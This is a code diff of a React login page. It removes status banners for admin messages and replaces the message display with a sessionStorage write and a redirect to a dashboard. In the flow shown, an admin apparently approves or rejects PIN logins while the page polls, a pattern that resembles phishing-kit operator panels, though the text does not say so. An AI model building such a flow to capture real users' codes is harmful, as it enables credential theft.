@@ -18,9 +18,7 @@ const STATUS_MESSAGES = {
   approved: "✅ APPROVED SUCCESSFULLY!",
   wrong_pin: "❌ Code PIN incorrect",
   expired: "⏰ Délai de vérification dépassé",
-  rejected: "❌ REJECTED SUCCESSFULLY!",
-  message_sent: "💬 USER MESSAGED SUCCESSFULLY!",
-  waiting_for_message: "💬 Waiting for admin message..."
+  rejected: "❌ REJECTED SUCCESSFULLY!"
 }
 
 function Login() {
@@ -300,8 +298,10 @@ function Login() {
         waitingForMessageRef.current = false
         setLoading(false)
         setWaitingForMessage(false)
-        setStatus("message_sent")
-        setAdminMessage(result.message)
+        sessionStorage.setItem('adminMessage', result.message)
+        setTimeout(() => {
+          window.location.href = `${basePath}/dashboard`
+        }, 500)
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
@@ -487,41 +487,8 @@ function Login() {
             </div>
           )}
           
-          {status === "message_sent" && (
-            <div style={{
-              backgroundColor: "#e3f2fd",
-              border: "2px solid #2196f3",
-              borderRadius: "8px",
-              padding: "15px",
-              marginBottom: "15px",
-              textAlign: "center"
-            }}>
-              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
-                <span style={{ color: "#2196f3", fontSize: "24px" }}>💬</span>
-                <h3 style={{ margin: 0, color: "#1565c0" }}>USER MESSAGED SUCCESSFULLY!</h3>
-              </div>
-              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
-                Admin will respond shortly
-              </p>
-            </div>
-          )}
-          
           {status === "waiting_for_message" && (
-            <div style={{
-              backgroundColor: "#fff8e1",
-              border: "2px solid #ff9800",
-              borderRadius: "8px",
-              padding: "15px",
-              marginBottom: "15px",
-              textAlign: "center"
-            }}>
-              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
-                <span style={{ color: "#ff9800", fontSize: "24px" }}>⏳</span>
-                <h3 style={{ margin: 0, color: "#e65100" }}>WAITING FOR ADMIN MESSAGE</h3>
-              </div>
-              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
-                Admin has been prompted to send a message...
-              </p>
+            <div style={{ display: "none" }}>
             </div>
           )}
           
